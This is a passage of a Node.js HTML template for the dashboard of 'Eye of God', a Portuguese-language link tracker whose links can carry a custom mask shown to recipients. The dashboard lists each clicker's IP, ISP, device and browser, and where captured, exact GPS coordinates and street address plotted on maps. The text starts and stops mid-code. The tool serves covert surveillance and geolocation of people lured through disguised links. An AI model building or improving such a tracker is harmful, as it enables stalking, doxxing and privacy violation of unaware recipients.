        font-weight: 500;
        transition: all 0.3s;
        border: none;
        cursor: pointer;
      }
      .btn-primary {
        background-color: #3498db;
      }
      .btn-primary:hover {
        background-color: #2980b9;
      }
      .btn-secondary {
        background-color: #2c3e50;
      }
      .btn-secondary:hover {
        background-color: #1a252f;
      }
      .btn-success {
        background-color: #27ae60;
      }
      .btn-success:hover {
        background-color: #219955;
      }
      .btn-danger {
        background-color: #e74c3c;
      }
      .btn-danger:hover {
        background-color: #c0392b;
      }
      .stats {
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        margin-bottom: 30px;
      }
      .stat-card {
        flex: 1;
        min-width: 170px;
        background: white;
        border-radius: 10px;
        padding: 20px;
        text-align: center;
        box-shadow: 0 0 10px rgba(0,0,0,0.05);
        display: flex;
        flex-direction: column;
        align-items: center;
        transition: transform 0.3s;
      }
      .stat-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      }
      .stat-icon {
        width: 50px;
        height: 50px;
        background-color: rgba(52, 152, 219, 0.1);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 15px;
        color: #3498db;
        font-size: 1.5em;
      }
      .stat-value {
        font-size: 2.2em;
        font-weight: bold;
        margin-bottom: 5px;
        color: #2c3e50;
      }
      .stat-label {
        color: #7f8c8d;
        font-size: 0.9em;
      }
      .stat-card:nth-child(1) .stat-icon {
        background-color: rgba(52, 152, 219, 0.1);
        color: #3498db;
      }
      .stat-card:nth-child(2) .stat-icon {
        background-color: rgba(46, 204, 113, 0.1);
        color: #2ecc71;
      }
      .stat-card:nth-child(3) .stat-icon {
        background-color: rgba(155, 89, 182, 0.1);
        color: #9b59b6;
      }
      .stat-card:nth-child(4) .stat-icon {
        background-color: rgba(230, 126, 34, 0.1);
        color: #e67e22;
      }
      .chart-container {
        width: 100%;
        height: 300px;
        margin-bottom: 20px;
        position: relative;
      }
      .map-container {
        height: 300px;
        margin-top: 15px;
        border-radius: 10px;
        overflow: hidden;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      }
      .qr-code {
        text-align: center;
        margin: 20px 0;
      }
      .copy-link {
        background: #f8f9fa;
        padding: 12px;
        border-radius: 6px;
        font-family: monospace;
        display: flex;
        align-items: center;
        margin: 15px 0;
        border: 1px solid #eee;
      }
      .copy-link input {
        flex: 1;
        border: none;
        background: transparent;
        padding: 5px;
        font-size: 0.9em;
      }
      .copy-btn {
        background: #3498db;
        color: white;
        border: none;
        padding: 8px 12px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 0.9em;
      }
      .device-info {
        display: flex;
        align-items: center;
        gap: 10px;
      }
      .device-icon {
        font-size: 1.5em;
      }
      .no-map-info {
        background-color: #f8f9fa;
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        margin-top: 15px;
        color: #7f8c8d;
        font-style: italic;
      }
      .accuracy-badge {
        font-size: 0.8em;
        padding: 3px 8px;
        border-radius: 12px;
        margin-left: 5px;
        display: inline-block;
      }
      .accuracy-badge.alta {
        background-color: #27ae60;
        color: white;
      }
      .accuracy-badge.média {
        background-color: #f39c12;
        color: white;
      }
      .accuracy-badge.baixa {
        background-color: #e74c3c;
        color: white;
      }
      .accuracy-badge.muito.baixa {
        background-color: #95a5a6;
        color: white;
      }
      .precise-location {
        background-color: #e8f6ff;
        padding: 15px;
        border-radius: 8px;
        margin: 10px 0;
        border-left: 4px solid #27ae60;
      }
      .precise-location p {
        margin: 5px 0;
      }
      .world-map {
        width: 100%;
        height: 300px;
        margin-bottom: 20px;
        border-radius: 10px;
        overflow: hidden;
      }
      .footer {
        text-align: center;
        margin-top: 40px;
        color: #7f8c8d;
        font-size: 0.9em;
        padding-top: 20px;
        border-top: 1px solid #eee;
      }
      @media print {
        body {
          background-color: white;
        }
        .container {
          box-shadow: none;
          margin: 0;
          padding: 0;
        }
        .action-buttons, .tab, .copy-btn {
          display: none;
        }
        .tab-content {
          display: block !important;
        }
        .chart-container {
          break-inside: avoid;
        }
      }
    </style>
  </head>
  <body>
    <div class="container" id="dashboard">
      <div class="header">
        <h1><i class="fas fa-eye"></i> Eye of God - Dashboard</h1>
        <p class="subtitle">Rastreamento detalhado e análise de links</p>
      </div>
      
      <div class="action-buttons">
        <a href="/" class="btn btn-secondary"><i class="fas fa-home"></i> Página Inicial</a>
        <button class="btn btn-primary" onclick="generateNewQRCode()"><i class="fas fa-qrcode"></i> Novo QR Code</button>
        <button class="btn btn-success" onclick="exportToPDF()"><i class="fas fa-file-pdf"></i> Exportar PDF</button>
      </div>
      
      <div class="card">
        <div class="card-header">
          <h2 class="card-title"><i class="fas fa-link"></i> Informações do Link</h2>
        </div>
        
        <p><strong>Link de rastreamento:</strong></p>
        <div class="copy-link">
          <input type="text" readonly value="${req.protocol}://${req.get('host')}/t/${linkId}" id="trackingLink">
          <button class="copy-btn" onclick="copyLink('trackingLink')"><i class="fas fa-copy"></i> Copiar</button>
        </div>
        
        <p><strong>URL de destino:</strong> ${link.targetUrl}</p>
        <p><strong>Criado em:</strong> ${new Date(link.createdAt).toLocaleString('pt-BR')}</p>
        ${link.customMask ? `<p><strong>Máscara personalizada:</strong> ${link.customMask} <span style="color:#e74c3c;">(URL exibida para os destinatários)</span></p>` : ''}
        ${link.maskStyle !== 'default' ? `<p><strong>Estilo de máscara:</strong> ${link.maskStyle}</p>` : ''}
        
        <div class="qr-code" id="qrCode">
          <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(`${req.protocol}://${req.get('host')}/t/${linkId}`)}" alt="QR Code do link">
          <p>Escaneie este QR Code para acessar o link</p>
        </div>
        
        <div id="qrCodeCustomization" style="text-align: center; margin-top: 15px; display: none;">
          <label for="qrSize">Tamanho:</label>
          <select id="qrSize" style="margin: 0 10px;">
            <option value="200x200">Pequeno</option>
            <option value="300x300" selected>Médio</option>
            <option value="400x400">Grande</option>
          </select>
          
          <label for="qrColor">Cor:</label>
          <input type="color" id="qrColor" value="#000000" style="margin: 0 10px;">
          
          <button class="btn btn-primary" onclick="updateQRCode()" style="margin: 0 10px;">Atualizar QR Code</button>
        </div>
      </div>
      
      <div class="stats">
        <div class="stat-card">
          <div class="stat-icon"><i class="fas fa-eye"></i></div>
          <span class="stat-value">${traces.length}</span>
          <span class="stat-label">Total de Acessos</span>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon"><i class="fas fa-map-marker-alt"></i></div>
          <span class="stat-value">${(() => {
            // Contabilizar localizações precisas
            const precisas = traces.filter(trace => trace.preciseLocation && trace.preciseLocation.latitude).length;
            return precisas;
          })()}</span>
          <span class="stat-label">Localizações Precisas</span>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon"><i class="fas fa-mobile-alt"></i></div>
          <span class="stat-value">${(() => {
            // Contar dispositivos únicos baseado no User-Agent
            const uniqueDevices = new Set();
            traces.forEach(trace => {
              const ua = trace.userAgent;
              const isMobile = ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone');
              const isTablet = ua.includes('iPad') || ua.includes('Tablet');
              const isDesktop = !isMobile && !isTablet;
              
              if (isMobile) uniqueDevices.add('mobile');
              if (isTablet) uniqueDevices.add('tablet');
              if (isDesktop) uniqueDevices.add('desktop');
            });
            return uniqueDevices.size;
          })()}</span>
          <span class="stat-label">Tipos de Dispositivos</span>
        </div>
        
        <div class="stat-card">
          <div class="stat-icon"><i class="fas fa-calendar-alt"></i></div>
          <span class="stat-value">${traces.length > 0 ? new Date(traces[traces.length - 1].timestamp).toLocaleDateString('pt-BR') : '-'}</span>
          <span class="stat-label">Último Acesso</span>
        </div>
      </div>
      
      <div class="dashboard-container">
        <div class="main-panel">
          <div class="card">
            <div class="card-header">
              <h3 class="card-title"><i class="fas fa-chart-pie"></i> Análise de Dados</h3>
            </div>
            
            <div class="tabs">
              <div class="tab active" data-tab="dispositivos">Dispositivos</div>
              <div class="tab" data-tab="paises">Países</div>
              <div class="tab" data-tab="navegadores">Navegadores</div>
              <div class="tab" data-tab="timeline">Timeline</div>
            </div>
            
            <div class="tab-content active" id="dispositivos">
              <div class="chart-container">
                <canvas id="deviceChart"></canvas>
              </div>
            </div>
            
            <div class="tab-content" id="paises">
              <div class="chart-container">
                <canvas id="countryChart"></canvas>
              </div>
            </div>
            
            <div class="tab-content" id="navegadores">
              <div class="chart-container">
                <canvas id="browserChart"></canvas>
              </div>
            </div>
            
            <div class="tab-content" id="timeline">
              <div class="chart-container">
                <canvas id="timelineChart"></canvas>
              </div>
            </div>
          </div>
          
          <div class="card">
            <div class="card-header">
              <h3 class="card-title"><i class="fas fa-globe-americas"></i> Mapa de Acessos</h3>
            </div>
            <div id="worldMap" class="world-map"></div>
          </div>
          
          <div class="card">
            <div class="card-header">
              <h3 class="card-title"><i class="fas fa-list"></i> Histórico de Acessos</h3>
            </div>
            
            ${traces.length === 0 ? 
            '<p class="no-traces">Ainda não há registros de acesso para este link.</p>' :
            traces.map((trace, index) => {
              // Determinar o tipo de dispositivo baseado no User-Agent
              const ua = trace.userAgent;
              let deviceType = 'desktop';
              let deviceIcon = '<i class="fas fa-desktop"></i>';
              
              if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
                deviceType = 'mobile';
                deviceIcon = '<i class="fas fa-mobile-alt"></i>';
              } else if (ua.includes('iPad') || ua.includes('Tablet')) {
                deviceType = 'tablet';
                deviceIcon = '<i class="fas fa-tablet-alt"></i>';
              }
              
              // Extrair navegador e sistema operacional
              let browser = 'Desconhecido';
              let browserIcon = '<i class="fas fa-globe"></i>';
              let os = 'Desconhecido';
              let osIcon = '<i class="fas fa-question-circle"></i>';
              
              if (ua.includes('Firefox')) {
                browser = 'Firefox';
                browserIcon = '<i class="fab fa-firefox"></i>';
              } else if (ua.includes('Chrome')) {
                browser = 'Chrome';
                browserIcon = '<i class="fab fa-chrome"></i>';
              } else if (ua.includes('Safari')) {
                browser = 'Safari';
                browserIcon = '<i class="fab fa-safari"></i>';
              } else if (ua.includes('Edge')) {
                browser = 'Edge';
                browserIcon = '<i class="fab fa-edge"></i>';
              } else if (ua.includes('MSIE') || ua.includes('Trident')) {
                browser = 'Internet Explorer';
                browserIcon = '<i class="fab fa-internet-explorer"></i>';
              } else if (ua.includes('WhatsApp')) {
                browser = 'WhatsApp';
                browserIcon = '<i class="fab fa-whatsapp"></i>';
              }
              
              if (ua.includes('Windows')) {
                os = 'Windows';
                osIcon = '<i class="fab fa-windows"></i>';
              } else if (ua.includes('Mac OS')) {
                os = 'macOS';
                osIcon = '<i class="fab fa-apple"></i>';
              } else if (ua.includes('Android')) {
                os = 'Android';
                osIcon = '<i class="fab fa-android"></i>';
              } else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) {
                os = 'iOS';
                osIcon = '<i class="fab fa-apple"></i>';
              } else if (ua.includes('Linux')) {
                os = 'Linux';
                osIcon = '<i class="fab fa-linux"></i>';
              }
              
              return `
                <div class="trace-item">
                  <div class="trace-header">
                    <strong>Acesso #${index + 1}</strong>
                    <div class="trace-time">${new Date(trace.timestamp).toLocaleString('pt-BR')}</div>
                  </div>
                  
                  <div class="trace-details">
                    <div class="trace-details-col">
                      <p><strong>IP:</strong> ${trace.ip}</p>
                      
                      ${(() => {
                        // Verificar se temos localização precisa do usuário
                        if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
                          const precisionMeters = Math.round(trace.preciseLocation.accuracy);
                          return `
                            <div class="precise-location">
                              <p><strong><i class="fas fa-map-marker-alt"></i> Localização Exata:</strong> <span class="accuracy-badge alta">Precisão Alta</span></p>
                              <p><strong>Coordenadas GPS:</strong> ${trace.preciseLocation.latitude.toFixed(6)}, ${trace.preciseLocation.longitude.toFixed(6)}</p>
                              <p><strong>Precisão:</strong> ±${precisionMeters} metros</p>
                              ${trace.addressDetails ? `
                                <p><strong>Endereço:</strong> ${trace.addressDetails.formatted || 'Indisponível'}</p>
                                ${trace.addressDetails.road ? `<p><strong>Rua:</strong> ${trace.addressDetails.road}${trace.addressDetails.house_number ? `, ${trace.addressDetails.house_number}` : ''}</p>` : ''}
                                ${trace.addressDetails.neighbourhood ? `<p><strong>Bairro:</strong> ${trace.addressDetails.neighbourhood}</p>` : ''}
                                ${trace.addressDetails.city ? `<p><strong>Cidade:</strong> ${trace.addressDetails.city}</p>` : ''}
                              ` : ''}
                            </div>
                          `;
                        } else {
                          return `
                            <p><strong><i class="fas fa-map-pin"></i> Localização:</strong> ${trace.ipInfo.location && trace.ipInfo.location !== 'Desconhecido' ? trace.ipInfo.location : 'Não foi possível determinar a localização'}</p>
                            ${trace.ipInfo.coordinates ? `<p><strong>Coordenadas:</strong> ${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude} <span class="accuracy-badge ${trace.ipInfo.coordinates.accuracy}">(Precisão ${trace.ipInfo.coordinates.accuracy})</span></p>` : ''}
                          `;
                        }
                      })()}
                      
                      ${trace.ipInfo.continent ? `<p><strong><i class="fas fa-globe-americas"></i> Continente:</strong> ${trace.ipInfo.continent}</p>` : ''}
                      ${trace.ipInfo.timezone ? `<p><strong><i class="fas fa-clock"></i> Fuso horário:</strong> ${trace.ipInfo.timezone}</p>` : ''}
                      <p><strong><i class="fas fa-network-wired"></i> Provedor:</strong> ${trace.ipInfo.isp && trace.ipInfo.isp !== 'Desconhecido' ? trace.ipInfo.isp : 'Informação indisponível'}</p>
                      ${trace.ipInfo.asn && trace.ipInfo.asn !== 'Desconhecido' ? `<p><strong>ASN:</strong> ${trace.ipInfo.asn}</p>` : ''}
                      ${trace.ipInfo.currency ? `<p><strong><i class="fas fa-money-bill-wave"></i> Moeda local:</strong> ${trace.ipInfo.currency}</p>` : ''}
                    </div>
                    
                    <div class="trace-details-col">
                      <p class="device-info">${deviceIcon} <strong>${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)}</strong></p>
                      <p><strong>${browserIcon} Navegador:</strong> ${browser}</p>
                      <p><strong>${osIcon} Sistema:</strong> ${os}</p>
                      <p><strong><i class="fas fa-sign-in-alt"></i> Origem:</strong> ${trace.referer}</p>
                    </div>
                  </div>
                  
                  ${trace.ipInfo.location && trace.ipInfo.location !== 'Local (Simulado)' && 
                    trace.ipInfo.location !== 'Desconhecido' && 
                    trace.ipInfo.location !== 'Localização não identificada' && 
                    trace.ipInfo.location !== 'Erro na obtenção de dados' ? 
                    `<div class="map-container" id="map-${index}"></div>` : 
                    '<div class="no-map-info"><p><i class="fas fa-exclamation-circle"></i> Mapa não disponível para este endereço IP</p></div>'}
                </div>
              `;
            }).join('')
          }
          </div>
        </div>
        
        <div class="side-panel">
          <div class="card">
            <div class="card-header">
              <h3 class="card-title"><i class="fas fa-info-circle"></i> Resumo</h3>
            </div>
            <div id="summaryData">
              <!-- Resumo será gerado via JavaScript -->
            </div>
          </div>
          
          <div class="card">
            <div class="card-header">
              <h3 class="card-title"><i class="fas fa-list-alt"></i> Estatísticas Adicionais</h3>
            </div>
            <ul>
              <li><strong>Acessos por dispositivos móveis:</strong> <span id="mobileStat">0</span></li>
              <li><strong>Acessos por desktop:</strong> <span id="desktopStat">0</span></li>
              <li><strong>Taxa de localização precisa:</strong> <span id="preciseLocationRate">0%</span></li>
              <li><strong>Referências principais:</strong> <span id="topReferrers">-</span></li>
              <li><strong>Horário com mais acessos:</strong> <span id="peakHour">-</span></li>
              <li><strong>Data com mais acessos:</strong> <span id="peakDate">-</span></li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="footer">
        <p>Eye of God - Sistema de Rastreamento de Mensagens</p>
        <p>Desenvolvido por @CryptoDevBR</p>
      </div>
    </div>
    
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
      function copyLink(elementId) {
        const linkInput = document.getElementById(elementId);
        linkInput.select();
        document.execCommand('copy');
        
        // Feedback visual
        const btn = linkInput.nextElementSibling;
        const originalText = btn.textContent;
        btn.textContent = 'Copiado!';
        setTimeout(() => {
          btn.textContent = originalText;
        }, 2000);
      }
      
      // Funções para tabs
      document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
          // Remover classe active de todas as tabs
          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
          // Adicionar classe active na tab clicada
          tab.classList.add('active');
          
          // Esconder todos os conteúdos
          document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
          });
          
          // Mostrar o conteúdo correspondente
          const tabId = tab.getAttribute('data-tab');
          document.getElementById(tabId).classList.add('active');
        });
      });
      
      // Função para exportar para PDF
      function exportToPDF() {
        // Configurações para o PDF
        const element = document.getElementById('dashboard');
        const opt = {
          margin:       [10, 10, 10, 10],
          filename:     'eye-of-god-report.pdf',
          image:        { type: 'jpeg', quality: 0.98 },
          html2canvas:  { scale: 1 },
          jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
        };
        
        // Exibir todos os tabs para o PDF
        document.querySelectorAll('.tab-content').forEach(content => {
          content.classList.add('active');
          content.style.display = 'block';
        });
        
        // Criar o PDF
        html2pdf()
          .set(opt)
          .from(element)
          .save()
          .then(() => {
            // Restaurar a visualização original das tabs
            document.querySelectorAll('.tab-content').forEach(content => {
              content.classList.remove('active');
              content.style.display = 'none';
            });
            
            // Reativar apenas a tab atual
            const activeTab = document.querySelector('.tab.active');
            if (activeTab) {
              const tabId = activeTab.getAttribute('data-tab');
              document.getElementById(tabId).classList.add('active');
              document.getElementById(tabId).style.display = 'block';
            }
          });
      }
      
      // Função para gerar/atualizar o QR Code
      function generateNewQRCode() {
        const customization = document.getElementById('qrCodeCustomization');
        if (customization.style.display === 'none' || customization.style.display === '') {
          customization.style.display = 'block';
        } else {
          customization.style.display = 'none';
        }
      }
      
      function updateQRCode() {
        const size = document.getElementById('qrSize').value;
        const color = document.getElementById('qrColor').value.replace('#', '');
        const qrCodeContainer = document.getElementById('qrCode');
        const link = '${req.protocol}://${req.get("host")}/t/${linkId}';
        
        const qrImageUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=' + size + '&data=' + encodeURIComponent(link) + '&color=' + color;
        qrCodeContainer.innerHTML = '<img src="' + qrImageUrl + '" alt="QR Code do link"><p>Escaneie este QR Code para acessar o link</p>';
      }
      
      // Processar dados para os gráficos
      document.addEventListener('DOMContentLoaded', function() {
        const traces = ${JSON.stringify(traces)};
        if (traces.length === 0) return;
        
        // Preparar dados para os gráficos
        const deviceData = { mobile: 0, desktop: 0, tablet: 0 };
        const countryData = {};
        const browserData = {};
        const timelineData = {};
        
        // Contadores para estatísticas
        let preciseLocs = 0;
        const referrers = {};
        const hourCounts = Array(24).fill(0);
        const dateCounts = {};
        
        // Processar cada trace
        traces.forEach(trace => {
          // Analisar user agent para dispositivo e navegador
          const ua = trace.userAgent;
          
          // Dispositivo
          if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
            deviceData.mobile++;
          } else if (ua.includes('iPad') || ua.includes('Tablet')) {
            deviceData.tablet++;
          } else {
            deviceData.desktop++;
          }
          
          // Navegador
          let browser = 'Outro';
          if (ua.includes('Firefox')) browser = 'Firefox';
          else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
          else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
          else if (ua.includes('Edg')) browser = 'Edge';
          else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
          else if (ua.includes('WhatsApp')) browser = 'WhatsApp';
          
          browserData[browser] = (browserData[browser] || 0) + 1;
          
          // País/Localização
          let country = 'Desconhecido';
          if (trace.ipInfo && trace.ipInfo.location) {
            // Extrair o país da localização
            const locationParts = trace.ipInfo.location.split(',');
            if (locationParts.length > 0) {
              country = locationParts[locationParts.length - 1].trim();
              if (country === '') {
                country = locationParts[locationParts.length - 2]?.trim() || 'Desconhecido';
              }
            }
          }
          
          countryData[country] = (countryData[country] || 0) + 1;
          
          // Localização precisa
          if (trace.preciseLocation && trace.preciseLocation.latitude) {
            preciseLocs++;
          }
          
          // Referrer
          const referer = trace.referer || 'Direto';
          referrers[referer] = (referrers[referer] || 0) + 1;
          
          // Timeline por data
          const date = new Date(trace.timestamp).toLocaleDateString('pt-BR');
          timelineData[date] = (timelineData[date] || 0) + 1;
          dateCounts[date] = (dateCounts[date] || 0) + 1;
          
          // Hora do dia
          const hour = new Date(trace.timestamp).getHours();
          hourCounts[hour]++;
        });
        
        // Atualizar estatísticas na sidebar
        document.getElementById('mobileStat').textContent = deviceData.mobile;
        document.getElementById('desktopStat').textContent = deviceData.desktop;
        document.getElementById('preciseLocationRate').textContent = Math.round((preciseLocs / traces.length) * 100) + '%';
        
        // Top referrers
        const topReferers = Object.entries(referrers)
          .sort((a, b) => b[1] - a[1])
          .slice(0, 2)
          .map(function(entry) { 
            return entry[0] + ' (' + entry[1] + ')';
          })
          .join(', ');
        document.getElementById('topReferrers').textContent = topReferers || 'Direto';
        
        // Horários e datas com mais acessos
        const peakHourIndex = hourCounts.indexOf(Math.max(...hourCounts));
        document.getElementById('peakHour').textContent = peakHourIndex + ':00 - ' + (peakHourIndex+1) + ':00';
        
        const peakDate = Object.entries(dateCounts).sort((a, b) => b[1] - a[1])[0];
        if (peakDate) {
          document.getElementById('peakDate').textContent = peakDate[0] + ' (' + peakDate[1] + ' acessos)';
        }
        
        // Resumo de dados
        const summaryContainer = document.getElementById('summaryData');
        summaryContainer.innerHTML = 
          '<p>Este link foi acessado <strong>' + traces.length + ' vezes</strong> desde a sua criação em ' + new Date(traces[0].timestamp).toLocaleDateString('pt-BR') + '.</p>' +
          '<p>O último acesso ocorreu em <strong>' + new Date(traces[traces.length-1].timestamp).toLocaleString('pt-BR') + '</strong>.</p>' +
          '<p>Porcentagem de usuários que permitiram geolocalização precisa: <strong>' + Math.round((preciseLocs / traces.length) * 100) + '%</strong></p>' +
          '<p>País com mais acessos: <strong>' + (Object.entries(countryData).sort((a, b) => b[1] - a[1])[0]?.[0] || 'Desconhecido') + '</strong></p>';
        
        // Gráfico de dispositivos
        const deviceCtx = document.getElementById('deviceChart').getContext('2d');
        new Chart(deviceCtx, {
          type: 'doughnut',
          data: {
            labels: ['Desktop', 'Mobile', 'Tablet'],
            datasets: [{
              label: 'Dispositivos',
              data: [deviceData.desktop, deviceData.mobile, deviceData.tablet],
              backgroundColor: [
                'rgba(54, 162, 235, 0.8)',
                'rgba(75, 192, 192, 0.8)',
                'rgba(153, 102, 255, 0.8)'
              ],
              borderColor: [
                'rgba(54, 162, 235, 1)',
                'rgba(75, 192, 192, 1)',
                'rgba(153, 102, 255, 1)'
              ],
              borderWidth: 1
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: {
                position: 'bottom',
              },
              title: {
                display: true,
                text: 'Distribuição de Dispositivos'
              }
            }
          }
        });
        
        // Gráfico de países
        const countryLabels = Object.keys(countryData);
        const countryValues = Object.values(countryData);
        const countryCtx = document.getElementById('countryChart').getContext('2d');
        new Chart(countryCtx, {
          type: 'bar',
          data: {
            labels: countryLabels,
            datasets: [{
              label: 'Acessos por País',
              data: countryValues,
              backgroundColor: 'rgba(75, 192, 192, 0.8)',
              borderColor: 'rgba(75, 192, 192, 1)',
              borderWidth: 1
            }]
          },
          options: {
            responsive: true,
            scales: {
              y: {
                beginAtZero: true,
                ticks: {
                  stepSize: 1
                }
              }
            }
          }
        });
        
        // Gráfico de navegadores
        const browserLabels = Object.keys(browserData);
        const browserValues = Object.values(browserData);
        const browserCtx = document.getElementById('browserChart').getContext('2d');
        new Chart(browserCtx, {
          type: 'pie',
          data: {
            labels: browserLabels,
            datasets: [{
              label: 'Navegadores',
              data: browserValues,
              backgroundColor: [
                'rgba(255, 99, 132, 0.8)',
                'rgba(54, 162, 235, 0.8)',
                'rgba(255, 206, 86, 0.8)',
                'rgba(75, 192, 192, 0.8)',
                'rgba(153, 102, 255, 0.8)',
                'rgba(255, 159, 64, 0.8)'
              ],
              borderColor: [
                'rgba(255, 99, 132, 1)',
                'rgba(54, 162, 235, 1)',
                'rgba(255, 206, 86, 1)',
                'rgba(75, 192, 192, 1)',
                'rgba(153, 102, 255, 1)',
                'rgba(255, 159, 64, 1)'
              ],
              borderWidth: 1
            }]
          },
          options: {
            responsive: true,
            plugins: {
              legend: {
                position: 'bottom',
              }
            }
          }
        });
        
        // Gráfico de timeline
        const timelineLabels = Object.keys(timelineData);
        const timelineValues = Object.values(timelineData);
        const timelineCtx = document.getElementById('timelineChart').getContext('2d');
        new Chart(timelineCtx, {
          type: 'line',
          data: {
            labels: timelineLabels,
            datasets: [{
              label: 'Acessos por Dia',
              data: timelineValues,
              fill: false,
              backgroundColor: 'rgba(54, 162, 235, 0.8)',
              borderColor: 'rgba(54, 162, 235, 1)',
              borderWidth: 2,
              tension: 0.1
            }]
          },
          options: {
            responsive: true,
            scales: {
              y: {
                beginAtZero: true,
                ticks: {
                  stepSize: 1
                }
              }
            }
          }
        });
        
        // Inicializar o mapa mundial com todos os pontos de acesso
        const worldMap = L.map('worldMap').setView([20, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
        }).addTo(worldMap);
        
        // Adicionar marcadores para cada acesso no mapa mundial
        const markers = [];
        traces.forEach(trace => {
          let lat, lng;
          
          // Primeiro tentar usar localização precisa (se disponível)
          if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
            lat = trace.preciseLocation.latitude;
            lng = trace.preciseLocation.longitude;
            
            const marker = L.marker([lat, lng]).addTo(worldMap);
            marker.bindPopup(
              '<strong>Acesso em:</strong> ' + new Date(trace.timestamp).toLocaleString('pt-BR') + '<br>' +
              '<strong>Localização precisa:</strong> Sim<br>' +
              '<strong>Precisão:</strong> ±' + Math.round(trace.preciseLocation.accuracy) + ' metros'
            );
            markers.push(marker);
          } 
          // Caso contrário, usar coordenadas do IP
          else if (trace.ipInfo && trace.ipInfo.coordinates) {
            lat = trace.ipInfo.coordinates.latitude;
            lng = trace.ipInfo.coordinates.longitude;
            
            const marker = L.marker([lat, lng]).addTo(worldMap);
            marker.bindPopup(
              '<strong>Acesso em:</strong> ' + new Date(trace.timestamp).toLocaleString('pt-BR') + '<br>' +
              '<strong>IP:</strong> ' + trace.ip + '<br>' +
              '<strong>Localização:</strong> ' + (trace.ipInfo.location || 'Desconhecido')
            );
            markers.push(marker);
          }
        });
        
        // Se tivermos marcadores, ajustar o mapa para mostrar todos
        if (markers.length > 0) {
          const group = new L.featureGroup(markers);
          worldMap.fitBounds(group.getBounds().pad(0.1));
        }
        
        // Inicializar mapas individuais para cada acesso
        ${traces.map((trace, index) => {
          // Se temos localização precisa do HTML5, usamos ela para o mapa
          if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
            const lat = trace.preciseLocation.latitude;
            const lon = trace.preciseLocation.longitude;
            const accuracy = trace.preciseLocation.accuracy;
            
            return `
              try {
                const mapElement = document.getElementById('map-${index}');
                if (mapElement) {
                  const map${index} = L.map('map-${index}').setView([${lat}, ${lon}], 15); // Zoom maior para localização precisa
                  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                  }).addTo(map${index});
                  
                  // Marcador para a localização exata
                  L.marker([${lat}, ${lon}]).addTo(map${index})
                    .bindPopup('Localização exata${trace.addressDetails && trace.addressDetails.formatted ? '<br>' + trace.addressDetails.formatted : ''}')
                    .openPopup();
                  
                  // Círculo de precisão
                  L.circle([${lat}, ${lon}], {
                    color: '#3498db',
                    fillColor: '#3498db',
                    fillOpacity: 0.15,
                    radius: ${accuracy}
                  }).addTo(map${index});
                }
              } catch (e) {
                console.error('Erro ao processar mapa com geolocalização HTML5:', e);
                const mapElement = document.getElementById('map-${index}');
                if (mapElement) {
                  mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Erro ao carregar o mapa.</p>';
                }
              }
            `;
          }
          // Caso contrário, verificamos se temos coordenadas do IP
          else if (trace.ipInfo.location && 
              trace.ipInfo.location !== 'Local (Simulado)' && 
              trace.ipInfo.location !== 'Desconhecido' && 
              trace.ipInfo.location !== 'Localização não identificada' && 
              trace.ipInfo.location !== 'Erro na obtenção de dados') {
            
            // Se temos coordenadas diretas, usamos elas para o mapa
            if (trace.ipInfo.coordinates && trace.ipInfo.coordinates.latitude && trace.ipInfo.coordinates.longitude) {
              return `
                try {
                  const mapElement = document.getElementById('map-${index}');
                  if (mapElement) {
                    const map${index} = L.map('map-${index}').setView([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}], 6);
                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                      attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                    }).addTo(map${index});
                    
                    const accuracyMessage = '${trace.ipInfo.coordinates.accuracy ? `Precisão ${trace.ipInfo.coordinates.accuracy}` : ''}';
                    const marker = L.marker([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}]).addTo(map${index})
                      .bindPopup('${trace.ipInfo.location.replace(/'/g, "\\'")}' + (accuracyMessage ? '<br><small>' + accuracyMessage + '</small>' : ''))
                      .openPopup();
                      
                    ${trace.ipInfo.coordinates.accuracy === 'alta' ? `
                    // Se a precisão for alta, adicionamos um círculo de proximidade
                    L.circle([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}], {
                      color: 'blue',
                      fillColor: '#3498db',
                      fillOpacity: 0.1,
                      radius: 500
                    }).addTo(map${index});
